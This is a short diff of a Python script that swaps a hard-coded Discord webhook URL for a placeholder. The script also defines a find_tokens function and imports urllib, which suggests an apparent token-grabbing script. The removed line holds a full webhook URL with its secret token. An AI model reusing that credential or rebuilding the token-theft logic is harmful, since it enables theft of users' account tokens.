@@ -5,7 +5,7 @@ import json
 from urllib.request import Request, urlopen
 
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/993067024827830333/ugZBVhYMKreipeFOUc1rjJJudqiNFdVHLzR-wD6gJmRMaJAyPcy_PiSlbk93iFIzEMUw"
+WEBHOOK_URL = "webhook"
 MENSAJE = False
 
 def find_tokens(path):
